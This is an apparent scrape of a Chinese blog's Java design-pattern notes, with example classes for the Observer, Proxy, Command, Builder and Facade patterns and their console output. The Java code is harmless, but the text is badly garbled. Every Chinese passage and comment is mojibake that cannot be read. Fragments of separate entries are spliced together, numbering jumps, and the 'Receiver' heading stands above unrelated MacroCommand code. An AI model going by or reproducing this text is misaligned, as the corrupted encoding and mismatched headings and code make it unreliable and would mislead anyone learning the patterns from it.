    package pers.huangyuhui.observer_pattern.observer_pattern_1;/** * @project: design-patterns * @description: æˆ˜é˜Ÿæˆå‘˜ç±», å……å½“å…·ä½“è§‚å¯Ÿè€…ç±» * @author: é»„å®‡è¾‰ * @date: 9/29/2019-12:21 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class Player implements Observer {    private String name;    public Player(String name) {        this.name = name;    }    @Override    public String getName() {        return name;    }    @Override    public void setName(String name) {        this.name = name;    }    //æ”¯æ´ç›Ÿå‹æ–¹æ³•çš„å®ç°    @Override    public void help() {        System.out.println("åšæŒä½! é˜Ÿå‹:[ " + this.name + " ]å‰æ¥æ”¯æ´ä½ ");    }    //é­å—æ”»å‡»æ–¹æ³•çš„å®ç°,å½“é­å—æ”»å‡»æ—¶å°†è°ƒç”¨æˆ˜é˜Ÿæ§åˆ¶ä¸­å¿ƒç±»çš„é€šçŸ¥æ–¹æ³•noifyObserver()æ¥é€šçŸ¥å„ä¸ªç›Ÿå‹    @Override    public void beAttacked(AllyControllerCenter allyControllerCenter) {        System.out.println("é˜Ÿå‹: [ " + this.name + " ]æ­£åœ¨è¢«æ•Œäººæ”»å‡»");        allyControllerCenter.noifyObserver(name);    }}

  5. Clientç±» : å®¢æˆ·ç«¯æµ‹è¯•ç±»

    package pers.huangyuhui.observer_pattern.observer_pattern_1;/** * @project: design-patterns * @description: å®¢æˆ·ç«¯æµ‹è¯•ç±» * @author: é»„å®‡è¾‰ * @date: 9/29/2019-12:31 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class Client {    public static void main(String[] args) {        //å®šä¹‰è§‚å¯Ÿç›®æ ‡å¯¹è±¡        AllyControllerCenter allyControllerCenter = new ConcreteAllyControlCenter("YU");        //å®šä¹‰å››ä¸ªè§‚å¯Ÿè€…å¯¹è±¡        Observer player1, player2, player3, player4;        player1 = new Player("player-A");        allyControllerCenter.join(player1);        player2 = new Player("player-B");        allyControllerCenter.join(player2);        player3 = new Player("player-C");        allyControllerCenter.join(player3);        player4 = new Player("player-D");        allyControllerCenter.join(player4);        //player-Aé˜Ÿå‹é­å—æ•Œäººæ”»å‡»        player1.beAttacked(allyControllerCenter);     }}

  6. ç¤ºä¾‹ç¨‹åºçš„è¿è¡Œç»“æœå¦‚ä¸‹æ‰€ç¤º :

ä»£ç†æ¨¡å¼æ˜¯å¸¸ç”¨çš„ç»“æ„å‹è®¾è®¡æ¨¡å¼ä¹‹ä¸€,å½“æ— æ³•ç›´æ¥è®¿é—®æŸä¸ªå¯¹è±¡æˆ–è®¿é—®æŸä¸ªå¯¹è±¡å­˜åœ¨å›°éš¾æ—¶å¯ä»¥é€šè¿‡ä¸€ä¸ªä»£ç†å¯¹è±¡æ¥é—´æ¥è®¿é—®,ä¸ºäº†ä¿è¯å®¢æˆ·ç«¯ä½¿ç”¨çš„é€æ˜æ€§,æ‰€è®¿é—®çš„çœŸå®å¯¹è±¡ä¸ä»£ç†å¯¹è±¡éœ€è¦å®ç°ç›¸åŒçš„æ¥å£. æ ¹æ®ä»£ç†æ¨¡å¼çš„ä½¿ç”¨ç›®çš„ä¸åŒ,ä»£ç†æ¨¡å¼åˆå¯ä»¥åˆ†ä¸ºå¤šç§ç±»å‹,ä¾‹å¦‚ä¿æŠ¤ä»£ç†,è¿œç¨‹ä»£ç†,è™šæ‹Ÿä»£ç†,ç¼“å†²ä»£ç†ç­‰,å®ƒä»¬åº”ç”¨äºä¸åŒçš„åœºåˆ,æ»¡è¶³ç”¨æˆ·çš„ä¸åŒéœ€æ±‚.

ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨ä»£ç†æ¨¡å¼( é™æ€ä»£ç† )çš„ç®€å•ç¤ºä¾‹ç¨‹åº : æ¨¡æ‹Ÿå®ç°æŸå•†åŠ¡ä¿¡æ¯æŸ¥è¯¢ç³»ç»Ÿçš„éƒ¨åˆ†åŠŸèƒ½ : ( ä¸€ )åœ¨è¿›è¡Œå•†åŠ¡ä¿¡æ¯æŸ¥è¯¢å‰ç”¨æˆ·éœ€è¦é€šè¿‡èº«ä»½éªŒè¯,åªæœ‰åˆæ³•çš„ç”¨æˆ·æ‰èƒ½å¤Ÿä½¿ç”¨è¯¥æŸ¥è¯¢ç³»ç»Ÿ. ( äºŒ )åœ¨è¿›è¡Œå•†åŠ¡ä¿¡æ¯æŸ¥è¯¢æ—¶ç³»ç»Ÿéœ€è¦è®°å½•å…¶æŸ¥è¯¢æ—¥å¿—,ä»¥ä¾¿æ ¹æ®æŸ¥è¯¢æ¬¡æ•°æ”¶å–æŸ¥è¯¢è´¹ç”¨

  1. AccessValidatorç±» : èº«ä»½éªŒè¯ç±»(ä¸šåŠ¡ç±»), å®ƒæä¾›validate()æ–¹æ³•æ¥å®ç°ç”¨æˆ·èº«ä»½çš„éªŒè¯

    package pers.huangyuhui.froxy_pattern.froxy_pattern_1;/** * @project: design-patterns * @description: èº«ä»½éªŒè¯ç±»(ä¸šåŠ¡ç±»), å®ƒæä¾›validate()æ–¹æ³•æ¥å®ç°ç”¨æˆ·èº«ä»½çš„éªŒè¯ * @author: é»„å®‡è¾‰ * @date: 9/25/2019-12:53 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class AccessValidator {    //æ¨¡æ‹Ÿå®ç°ç™»å½•éªŒè¯    public boolean validate(String userId) {        if (userId.equalsIgnoreCase("yubuntu0109")) {            System.out.println("IDä¸º:[ " + userId + " ]çš„ç”¨æˆ·ç™»å½•æˆåŠŸ");            return true;        } else {            System.out.println("IDä¸º:[ " + userId + " ]çš„ç”¨æˆ·ç™»å½•å¤±è´¥");            return false;        }    }}

  2. Loggerç±» : æ—¥å¿—è®°å½•ç±»(ä¸šåŠ¡ç±»), æä¾›ä¸€ä¸ªlog()æ–¹æ³•æ¥ä¿å­˜æ—¥å¿—ä¿¡æ¯

    package pers.huangyuhui.froxy_pattern.froxy_pattern_1;/** * @project: design-patterns * @description: æ—¥å¿—è®°å½•ç±»(ä¸šåŠ¡ç±»), æä¾›ä¸€ä¸ªlog()æ–¹æ³•æ¥ä¿å­˜æ—¥å¿—ä¿¡æ¯ * @author: é»„å®‡è¾‰ * @date: 9/25/2019-12:57 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class Logger {    //æ¨¡æ‹Ÿå®ç°æ—¥å¿—è®°å½•    public void log(String userId) {        System.out.println("æˆåŠŸæ›´æ–°æ•°æ®åº“ä¿¡æ¯,IDä¸º:[ " + userId + "+ ]çš„ç”¨æˆ·æŸ¥è¯¢æ¬¡æ•°+1");    }}

  3. Searcheræ¥å£ : æŠ½è±¡æŸ¥è¯¢ç±», å……å½“æŠ½è±¡ä¸»é¢˜è§’è‰²

    package pers.huangyuhui.froxy_pattern.froxy_pattern_1;/** * @project: design-patterns * @description: æŠ½è±¡æŸ¥è¯¢ç±», å……å½“æŠ½è±¡ä¸»é¢˜è§’è‰² * @author: é»„å®‡è¾‰ * @date: 9/25/2019-1:00 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public interface Searcher {    String doSearch(String userId, String keyWord);}

  4. RealSearcherç±» : å…·ä½“æŸ¥è¯¢ç±», å……å½“çœŸå®ä¸»é¢˜è§’è‰², å®ƒå®ç°äº†æŸ¥è¯¢åŠŸèƒ½

    package pers.huangyuhui.froxy_pattern.froxy_pattern_1;/** * @project: design-patterns * @description: å…·ä½“æŸ¥è¯¢ç±», å……å½“çœŸå®ä¸»é¢˜è§’è‰², å®ƒå®ç°äº†æŸ¥è¯¢åŠŸèƒ½ * @author: é»„å®‡è¾‰ * @date: 9/25/2019-1:01 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class RealSearcher implements Searcher {    //æ¨¡æ‹ŸæŸ¥è¯¢å•†åŠ¡ä¿¡æ¯    @Override    public String doSearch(String userId, String keyWord) {        System.out.println("IDä¸º:[ " + userId + " ]çš„ç”¨æˆ·ä½¿ç”¨å…³é”®å­—:[ " + keyWord + " ]æŸ¥è¯¢äº†å•†åŠ¡ä¿¡æ¯");        return "[ è¿™æ˜¯ç”¨æˆ·æ‰€æŸ¥è¯¢çš„å•†åŠ¡ä¿¡æ¯ç»“æœ ]";    }}

  5. ProxySearcherç±» : ä»£ç†æŸ¥è¯¢ç±», å……å½“ä»£ç ä¸»é¢˜è§’è‰², å®ƒæ˜¯æŸ¥è¯¢ä»£ç†, ç»´æŒäº†å¯¹RealSearcher, AccessValidator, åŠLoggerå¯¹è±¡çš„å¼•ç”¨

    package pers.huangyuhui.froxy_pattern.froxy_pattern_1;/** * @project: design-patterns * @description: ä»£ç†æŸ¥è¯¢ç±», å……å½“ä»£ç ä¸»é¢˜è§’è‰², å®ƒæ˜¯æŸ¥è¯¢ä»£ç†, ç»´æŒäº†å¯¹RealSearcher, AccessValidator, åŠLoggerå¯¹è±¡çš„å¼•ç”¨ * @author: é»„å®‡è¾‰ * @date: 9/25/2019-1:05 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class ProxySearcher implements Searcher {    private RealSearcher realSearcher = new RealSearcher(); //ç»´æŒä¸€ä¸ªå¯¹çœŸå®ä¸»é¢˜çš„å¼•ç”¨    private AccessValidator accessValidator;    private Logger logger;    @Override    public String doSearch(String userId, String keyWord) {        //å¦‚æœèº«ä»½éªŒè¯æˆåŠŸ,åˆ™æ‰§è¡ŒæŸ¥è¯¢æ“ä½œ        if (this.validate(userId)) {            String result = realSearcher.doSearch(userId, keyWord); //è°ƒç”¨çœŸå®ä¸»é¢˜çš„æŸ¥è¯¢æ–¹æ³•            this.log(userId); //è®°å½•æŸ¥è¯¢æ—¥å¿—            return result;        } else {            return null;        }    }    //åˆ›å»ºè®¿é—®éªŒè¯å¯¹è±¡å¹¶è°ƒç”¨å…¶validate()æ–¹æ³•æ¥å®ç°èº«ä»½éªŒè¯    public boolean validate(String userId) {        accessValidator = new AccessValidator();        return accessValidator.validate(userId);    }    //åˆ›å»ºæ—¥å¿—è®°å½•å¯¹è±¡å¹¶è°ƒç”¨å…¶log()æ–¹æ³•æ¥å®ç°æ—¥å¿—è®°å½•    public void log(String userId) {        logger = new Logger();        logger.log(userId);    }}

  6. Clientç±» : å®¢æˆ·ç«¯æµ‹è¯•ç±»

    package pers.huangyuhui.froxy_pattern.froxy_pattern_1;/** * @project: design-patterns * @description: å®¢æˆ·ç«¯æµ‹è¯•ç±» * @author: é»„å®‡è¾‰ * @date: 9/25/2019-1:13 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class Client {    public static void main(String[] args) {        Searcher searcher = new ProxySearcher();        System.out.println(searcher.doSearch("yubuntu0109", "design-patterns-in-java"));    }}

  7. ç¤ºä¾‹ç¨‹åºçš„è¿è¡Œç»“æœå¦‚ä¸‹æ‰€ç¤º :

    IDä¸º:[ yubuntu0109 ]çš„ç”¨æˆ·ç™»å½•æˆåŠŸIDä¸º:[ yubuntu0109 ]çš„ç”¨æˆ·ä½¿ç”¨å…³é”®å­—:[ design-patterns-in-java ]æŸ¥è¯¢äº†å•†åŠ¡ä¿¡æ¯æˆåŠŸæ›´æ–°æ•°æ®åº“ä¿¡æ¯,IDä¸º:[ yubuntu0109+ ]çš„ç”¨æˆ·æŸ¥è¯¢æ¬¡æ•°+1[ è¿™æ˜¯ç”¨æˆ·æ‰€æŸ¥è¯¢çš„å•†åŠ¡ä¿¡æ¯ç»“æœ ]

ç¤ºä¾‹ç¨‹åºçš„ç±»å›¾

ç¤ºä¾‹ç¨‹åº-åŠ¨æ€ä»£ç†

ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨ä»£ç†æ¨¡å¼( åŠ¨æ€ä»£ç† )çš„ç¤ºä¾‹ç¨‹åº : æ¨¡æ‹Ÿä¸ºæŸ OA ç³»ç»Ÿæ•°æ®è®¿é—®å±‚( DAO )å¢åŠ æ–¹æ³•è°ƒç”¨æ—¥å¿—,æ—¢è®°å½•æ¯ä¸€ä¸ªæ–¹æ³•è¢«è°ƒç”¨çš„å¼€å§‹åŠç»“æŸæ—¶é—´

  1. AbstractUserDaoæ¥å£ : æŠ½è±¡ç”¨æˆ·DAOç±», å……å½“æŠ½è±¡ä¸»é¢˜è§’è‰²

    package pers.huangyuhui.froxy_pattern.froxy_pattern_2;/** * @project: design-patterns * @description: æŠ½è±¡ç”¨æˆ·DAOç±», å……å½“æŠ½è±¡ä¸»é¢˜è§’è‰² * @author: é»„å®‡è¾‰ * @date: 9/25/2019-1:16 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public interface AbstractUserDao {    boolean findUserById(String userId);}

  2. AbstractDocumentDaoæ¥å£ : æŠ½è±¡æ–‡æ¡£DAOç±», å……å½“æŠ½è±¡ä¸»é¢˜è§’è‰²

    package pers.huangyuhui.froxy_pattern.froxy_pattern_2;/** * @project: design-patterns * @description: æŠ½è±¡æ–‡æ¡£DAOç±», å……å½“æŠ½è±¡ä¸»é¢˜è§’è‰² * @author: é»„å®‡è¾‰ * @date: 9/25/2019-1:17 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public interface AbstractDocumentDao {    boolean deleteDocumentById(String documentId);}

  3. DocumentDaoç±» : æ–‡æ¡£DAOç±», å……å½“å…·ä½“ä¸»é¢˜è§’è‰²

    package pers.huangyuhui.froxy_pattern.froxy_pattern_2;/** * @project: design-patterns * @description: æ–‡æ¡£DAOç±», å……å½“å…·ä½“ä¸»é¢˜è§’è‰² * @author: é»„å®‡è¾‰ * @date: 9/25/2019-1:21 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class DocumentDao implements AbstractDocumentDao {    @Override    public boolean deleteDocumentById(String documentId) {        if (documentId.equalsIgnoreCase("Y001")) {            System.out.println("æˆåŠŸåˆ é™¤IDä¸º:[ " + documentId + " ]çš„æ–‡æ¡£ä¿¡æ¯");            return true;        } else {            System.out.println("å¹¶æœªæ‰¾åˆ°IDä¸º:[ " + documentId + " ]çš„æ–‡æ¡£ä¿¡æ¯");            return false;        }    }}

  4. UserDaoç±» : ç”¨æˆ·DAOç±», å……å½“å…·ä½“ä¸»é¢˜è§’è‰²

    package pers.huangyuhui.froxy_pattern.froxy_pattern_2;/** * @project: design-patterns * @description: ç”¨æˆ·DAOç±», å……å½“å…·ä½“ä¸»é¢˜è§’è‰² * @author: é»„å®‡è¾‰ * @date: 9/25/2019-1:18 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class UserDao implements AbstractUserDao {    @Override    public boolean findUserById(String userId) {        if (userId.equalsIgnoreCase("yubuntu0109")) {            System.out.println("æˆåŠŸæŸ¥è¯¢IDä¸º:[ " + userId + " ]çš„ç”¨æˆ·ä¿¡æ¯");            return true;        } else {            System.out.println("å¹¶æœªæŸ¥è¯¢IDä¸º:[" + userId + " ]çš„ç”¨æˆ·ä¿¡æ¯");            return false;        }    }}

  5. DAOLogHandlerç±» : è‡ªå®šä¹‰è¯·æ±‚å¤„ç†ç¨‹åºç±»

    package pers.huangyuhui.froxy_pattern.froxy_pattern_2;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.util.Date;import java.util.Timer;/** * @project: design-patterns * @description: è‡ªå®šä¹‰è¯·æ±‚å¤„ç†ç¨‹åºç±» * @author: é»„å®‡è¾‰ * @date: 9/25/2019-1:24 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class DAOLogHandler implements InvocationHandler {    private Object object;    public DAOLogHandler() {    }    //æ³¨å…¥ä¸€ä¸ªéœ€è¦æä¾›ä»£ç†çš„çœŸå®ä¸»é¢˜å¯¹è±¡    public DAOLogHandler(Object object) {        this.object = object;    }    public void beforeInvoke() {        System.out.println("------> invoke before: " + new Date().toString());    }    public void afterInvoke() {        System.out.println("------> invoke after: " + new Date().toString());    }    //å®ç°invoke()æ–¹æ³•,è°ƒç”¨åœ¨çœŸå®ä¸»é¢˜ç±»ä¸­å®šä¹‰çš„æ–¹æ³•    @Override    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {        beforeInvoke();        Object result = method.invoke(object, args); //è½¬å‘è°ƒç”¨        afterInvoke();        return result;    }}

  6. Clientç±» : å®¢æˆ·ç«¯æµ‹è¯•ç±»

    package pers.huangyuhui.froxy_pattern.froxy_pattern_2;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;/** * @project: design-patterns * @description: å®¢æˆ·ç«¯æµ‹è¯•ç±» * @author: é»„å®‡è¾‰ * @date: 9/25/2019-1:29 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class Client {    public static void main(String[] args) {        InvocationHandler handler = new DAOLogHandler(new UserDao());        AbstractUserDao proxy = (AbstractUserDao) Proxy.newProxyInstance(AbstractUserDao.class.getClassLoader(), new Class[]{AbstractUserDao.class}, handler);        proxy.findUserById("yubuntu0109");        System.out.println("------------------------------");        InvocationHandler handler2 = new DAOLogHandler(new DocumentDao());        AbstractDocumentDao proxy2 = (AbstractDocumentDao) Proxy.newProxyInstance(AbstractDocumentDao.class.getClassLoader(), new Class[]{AbstractDocumentDao.class}, handler2);        proxy2.deleteDocumentById("Y001");    }}

  7. ç¤ºä¾‹ç¨‹åºè¿è¡Œçš„ç»“æœå¦‚ä¸‹æ‰€ç¤º :

    ------> invoke before: Fri Sep 27 14:05:06 CST 2019æˆåŠŸæŸ¥è¯¢IDä¸º:[ yubuntu0109 ]çš„ç”¨æˆ·ä¿¡æ¯------> invoke after: Fri Sep 27 14:05:06 CST 2019------------------------------------> invoke before: Fri Sep 27 14:05:06 CST 2019æˆåŠŸåˆ é™¤IDä¸º:[ Y001 ]çš„æ–‡æ¡£ä¿¡æ¯------> invoke after: Fri Sep 27 14:05:06 CST 2019

entry.title: Javaè®¾è®¡æ¨¡å¼ä¹‹Command Pattern
entry.content:
å­¦ä¹ ç¬”è®° : Javaè®¾è®¡æ¨¡å¼ä¹‹Command Pattern

å®šä¹‰

å‘½ä»¤æ¨¡å¼ : å°†ä¸€ä¸ªè¯·æ±‚å°è£…ä¸ºä¸€ä¸ªå¯¹è±¡,ä»è€Œå¯ç”¨ä¸åŒçš„è¯·æ±‚å¯¹å®¢æˆ·è¿›è¡Œå‚æ•°åŒ–,å¯¹è¯·æ±‚æ’é˜Ÿæˆ–è€…è®°å½•è¯·æ±‚æ—¥å¿—,ä»¥åŠæ”¯æŒå¯æ’¤é”€çš„æ“ä½œ. ( Command Pattern : Encapsulate a request as an object, thereby letting you parameterize clients with different requests, queue or log requests, and undoable operations )

  • æ‰© : å‘½ä»¤æ¨¡å¼æ˜¯ä¸€ç§å¯¹è±¡è¡Œä¸ºå‹æ¨¡å¼,å…¶åˆ«åä¸ºåŠ¨ä½œ( Action )æ¨¡å¼æˆ–äº‹ç‰©( Transaction )æ¨¡å¼. å‘½ä»¤æ¨¡å¼æ˜¯å¸¸ç”¨çš„è¡Œä¸ºå‹æ¨¡å¼ä¹‹ä¸€,å®ƒå°†è¯·æ±‚å‘é€è€…ä¸è¯·æ±‚æ¥æ”¶è€…è§£è€¦,è¯·æ±‚å‘é€è€…é€šè¿‡å‘½ä»¤å¯¹è±¡æ¥é—´æ¥å¼•ç”¨æ¥å—è€…,ä½¿å¾—ç³»ç»Ÿå…·æœ‰æ›´å¥½çš„çµæ´»æ€§,å¯ä»¥åœ¨ä¸ä¿®æ”¹ç°æœ‰ç³»ç»Ÿæºç ä»£ç çš„æƒ…å†µä¸‹è®©ç›¸åŒçš„å‘é€è€…å¯¹åº”ä¸åŒçš„æ¥å—è€….

  4. Receiver( æ¥æ”¶è€… ) : æ¥æ”¶è€…æ‰§è¡Œä¸è¯·æ±‚ç›¸å…³çš„æ“ä½œ,å…·ä½“å®ç°å¯¹è¯·æ±‚ä¸šåŠ¡çš„å¤„ç†.

    package pers.huangyuhui.command_pattern.command_pattern_2;import java.util.Stack;/** * @project: design-patterns * @description: è¡¨ç¤º"ç”±å¤šæ¡å‘½ä»¤æ•´åˆæˆçš„å‘½ä»¤"çš„ç±»,å……å½“å…·ä½“çš„å‘½ä»¤ * @author: é»„å®‡è¾‰ * @date: 9/20/2019-9:27 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class MacroCommand implements Command {    //å‘½ä»¤çš„é›†åˆ    private Stack commands = new Stack();    //æ‰§è¡Œå‘½ä»¤    @Override    public void execute() {        for (Object command : commands) {            ((Command) command).execute();        }    }    //æ·»åŠ å‘½ä»¤    public void append(Command command) {        if (command != this) {            commands.push(command);        }    }    //æ¸…é™¤å‘½ä»¤    public void clear() {        commands.clear();    }}

    package pers.huangyuhui.command_pattern.command_pattern_2;import javax.swing.*;import java.awt.*;import java.awt.event.MouseEvent;import java.awt.event.MouseMotionAdapter;/** * @project: design-patterns * @description: å®¢æˆ·ç«¯æµ‹è¯•ç±» * @author: é»„å®‡è¾‰ * @date: 9/20/2019-9:48 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class Client extends JFrame {    //ç»˜åˆ¶çš„å†å²è®°å½•    private MacroCommand history = new MacroCommand();    //ç»˜åˆ¶åŒºåŸŸ(è®¾ç½®ç”»æ¿å¤§å°)    private DrawCanvas canvas = new DrawCanvas(600, 400, history);    //åˆ é™¤æŒ‰é’®    private JButton clearButton = new JButton("clear");    public Client(String title) {        super(title);        /*        é¼ æ ‡æ‹–åŠ¨äº‹ä»¶         */        canvas.addMouseMotionListener(new MouseMotionAdapter() {            @Override            public void mouseDragged(MouseEvent e) {                Command command = new DrawCommand(canvas, e.getPoint());                history.append(command);                command.execute();            }        });        /*        åŠ¨ä½œç›‘å¬äº‹ä»¶         */        clearButton.addActionListener(e -> {            if (e.getSource() == clearButton) {                history.clear();                canvas.repaint();            }        });        /*        JFrameé¢æ¿é…ç½®         */        setLayout(new BorderLayout());        add(clearButton, BorderLayout.NORTH);        add(canvas, BorderLayout.SOUTH);        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);        pack();        setVisible(true);    }    public static void main(String[] args) {        new Client("a simple drawing board");    }}

entry.title: Javaè®¾è®¡æ¨¡å¼ä¹‹Builder Pattern

å­¦ä¹ ç¬”è®° : Javaè®¾è®¡æ¨¡å¼ä¹‹Builder Pattern

æ¦‚è¿°

ç¼”é€ è€…è®¾è®¡æ¨¡å¼ : å°†ä¸€ä¸ªå¤æ‚å¯¹è±¡çš„æ„å»ºä¸å®ƒçš„è¡¨ç¤ºåˆ†ç¦»,ä½¿å¾—åŒæ ·çš„æ„å»ºè¿‡ç¨‹å¯ä»¥åˆ›å»ºä¸åŒçš„è¡¨ç¤º( Builder Pattern : Separate the construction of complex object from its representation so that the same construction process can create different representations )

  • æ‰© : å»ºé€ è€…æ¨¡å¼æ˜¯ä¸€ç§å¯¹è±¡åˆ›å»ºå‹æ¨¡å¼,å®ƒå°†å®¢æˆ·ç«¯ä¸åŒ…å«å¤šä¸ªéƒ¨ä»¶çš„å¤æ‚å¯¹è±¡çš„åˆ›å»ºè¿‡ç¨‹åˆ†ç¦»,å®¢æˆ·ç«¯æ— éœ€çŸ¥é“å¤æ‚å¯¹è±¡çš„å†…éƒ¨ç»„æˆéƒ¨åˆ†ä¸è£…é…æ–¹å¼,åªéœ€è¦çŸ¥é“æ‰€éœ€å»ºé€ è€…çš„ç±»å‹å³å¯.

å»ºé€ è€…è®¾è®¡æ¨¡å¼ä¸­çš„è§’è‰²

  1. Builder( æŠ½è±¡å»ºé€ è€… ) : å®ƒä¸ºåˆ›å»ºä¸€ä¸ªäº§å“çš„å„ä¸ªéƒ¨ä»¶æŒ‡å®šæŠ½è±¡æ¥å£,åœ¨è¯¥æ¥å£ä¸­ä¸€èˆ¬å£°æ˜ä¸¤ç±»æ–¹æ³•,ä¸€ç±»æ–¹æ³•æ˜¯ buildPartX(),å…¶ç”¨äºåˆ›å»ºå¤æ‚å¯¹è±¡çš„å„ä¸ªéƒ¨ä»¶. å¦ä¸€ç±»æ–¹æ³•æ˜¯ getResult(),å…¶ç”¨äºè¿”å›å¤æ‚å¯¹è±¡. Builder å³å¯æ˜¯æŠ½è±¡ç±»,ä¹Ÿå¯ä»¥æ˜¯æ¥å£.
  2. ConcreteBuilder( å…·ä½“å»ºé€ è€… ) : å®ƒå®ç°äº† Builder æ¥å£,å®ç°äº†å„ä¸ªéƒ¨ä»¶çš„å…·ä½“æ„é€ å’Œè£…é…æ–¹æ³•,å®šä¹‰å¹¶æ˜ç¡®æ‰€åˆ›å»ºçš„å¤æ‚å¯¹è±¡,è¿˜å¯ä»¥æä¾›ä¸€ä¸ªç”¨äºè¿”å›åˆ›å»ºå¥½çš„å¤æ‚äº§å“çš„æ–¹æ³•( è¯¥æ–¹æ³•å¯ä»¥ç”±æŠ½è±¡æ„å»ºè€…å®ç° ).

  4. Director( æŒ‡æŒ¥è€… ) : æŒ‡æŒ¥è€…åˆç§°ä¸ºå¯¼æ¼”ç±»,å®ƒè´Ÿè´£å®‰æ’å¤æ‚å¯¹è±¡çš„å»ºé€ æ¬¡åº,æŒ‡æŒ¥è€…ä¸æŠ½è±¡æ„å»ºè€…ä¹‹é—´å­˜åœ¨å…³è”å…³ç³»,å¯ä»¥åœ¨å…¶ construct() å»ºé€ æ–¹æ³•ä¸­è°ƒç”¨å»ºé€ è€…å¯¹è±¡çš„éƒ¨ä»¶æ„é€ ä¸è£…é…æ–¹æ³•,å®Œæˆå¤æ‚å¯¹è±¡çš„å»ºé€ .

ç¤ºä¾‹ç¨‹åº

ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨äº†å»ºé€ è€…è®¾è®¡æ¨¡å¼çš„ç®€å•ç¤ºä¾‹ç¨‹åº,å…¶æ¦‚è¿°ä¸º : æ— è®ºæ˜¯ä½•ç§æ¸¸æˆè§’è‰²,éƒ½éœ€è¦é€æ­¥åˆ›å»ºå…¶ç»„æˆéƒ¨åˆ†,å†å°†å„ç»„æˆéƒ¨åˆ†é…è£…æˆä¸€ä¸ªå®Œæ•´çš„æ¸¸æˆè§’è‰².

  1. Actorç±» : æ¸¸æˆè§’è‰²ç±», å……å½“å¤æ‚äº§å“å¯¹è±¡

å­¦ä¹ ç¬”è®° : Javaè®¾è®¡æ¨¡å¼ä¹‹Facade Pattern

ä¸ºå­ç³»ç»Ÿä¸­çš„ä¸€ç»„æ¥å£æä¾›ä¸€ä¸ªç»Ÿä¸€çš„å…¥å£. å¤–è§‚æ¨¡å¼å®šä¹‰äº†ä¸€ä¸ªé«˜å±‚æ¥å£,è¿™ä¸ªæ¥å£ä½¿å¾—è¿™ä¸€å­ç³»ç»Ÿæ›´åŠ å®¹æ˜“ä½¿ç”¨. ( Facade Pattern : Provide a unified interface to a set of interfaces in a subsystem. Facade defines a highter-level interface that makes the subsystem easier to use. )

  • æ‰© : å¤–è§‚æ¨¡å¼åˆç§°é—¨é¢æ¨¡å¼,å®ƒæ˜¯ä¸€ç§å¯¹è±¡ç»“æ„å‹æ¨¡å¼. å¤–è§‚æ¨¡å¼æ˜¯è¿ªç±³ç‰¹æ³•åˆ™çš„ä¸€ç§å…·ä½“å®ç°,é€šè¿‡å¼•å…¥ä¸€ä¸ªæ–°çš„å¤–è§‚è§’è‰²æ¥é™ä½åŸæœ‰ç³»ç»Ÿçš„å¤æ‚åº¦,åŒæ—¶é™ä½å®¢æˆ·ç±»ä¸å­ç³»ç»Ÿçš„è€¦åˆåº¦.

SubSystem( å­ç³»ç»Ÿè§’è‰² ) : åœ¨è½¯ä»¶ç³»ç»Ÿä¸­æœ‰ä¸€ä¸ªæˆ–è€…å¤šä¸ªå­ç³»ç»Ÿè§’è‰²,æ¯ä¸€ä¸ªå­ç³»ç»Ÿå¯ä»¥ä¸æ˜¯ä¸€ä¸ªå•ç‹¬çš„ç±»,è€Œæ˜¯ä¸€ä¸ªç±»çš„é›†åˆ,å®ƒå®ç°äº†å­ç³»ç»Ÿçš„åŠŸèƒ½. æ¯ä¸€ä¸ªå­ç³»ç»Ÿéƒ½å¯ä»¥è¢«å®¢æˆ·ç«¯ç›´æ¥è°ƒç”¨,æˆ–è€…è¢«å¤–è§‚è§’è‰²è°ƒç”¨,å®ƒå¤„ç†ç”±å¤–è§‚ç±»ä¼ é€’è¿‡æ¥çš„è¯·æ±‚. å­ç³»ç»Ÿå¹¶ä¸çŸ¥é“å¤–è§‚ç±»çš„å­˜åœ¨,å¯¹äºå­ç³»ç»Ÿè€Œè¨€,å¤–è§‚è§’è‰²ä»…ä»…æ˜¯å¦å¤–ä¸€ä¸ªå®¢æˆ·ç«¯è€Œå·².

  1. FileReaderç±» : æ–‡ä»¶è¯»å–ç±», å……å½“å­ç³»ç»Ÿç±»

    package pers.huangyuhui.facade_pattern.facade_pattern_1;import java.io.FileInputStream;import java.io.IOException;/** * @project: design-patterns * @description: æ–‡ä»¶è¯»å–ç±», å……å½“å­ç³»ç»Ÿç±» * @author: é»„å®‡è¾‰ * @date: 9/12/2019-9:36 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class FileReader {    public String read(String path) {        var stringBuffer = new StringBuilder();        try (var fileInputStream = new FileInputStream(path)) {            var data = 0;            while ((data = fileInputStream.read()) != -1) {                stringBuffer.append((char) data); //char            }        } catch (IOException e) {            e.printStackTrace();        }        return stringBuffer.toString();    }}

    package pers.huangyuhui.facade_pattern.facade_pattern_1;import java.io.FileOutputStream;import java.io.IOException;/** * @project: design-patterns * @description: æ–‡ä»¶ä¿å­˜ç±», å……å½“å­ç±»ç³»ç»Ÿç±» * @author: é»„å®‡è¾‰ * @date: 9/12/2019-9:56 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class FileWriter {    public void write(String encryptStr, String path) {        try (var fileOutputStream = new FileOutputStream(path)) {            fileOutputStream.write(encryptStr.getBytes());        } catch (IOException e) {            e.printStackTrace();        }    }}

